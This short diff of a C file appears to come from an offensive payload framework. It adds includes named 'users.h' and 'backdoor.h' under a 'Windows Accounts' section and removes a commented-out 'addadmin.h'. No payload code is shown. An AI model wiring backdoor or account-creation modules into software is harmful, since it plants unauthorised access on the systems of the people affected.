@@ -13,7 +13,8 @@
 /*
  * Windows Accounts
  */
-//#include "w_accounts/addadmin.h"
+#include "w_accounts/users.h"
+#include "w_accounts/backdoor.h"
 
 /*
  * Networking Payloads
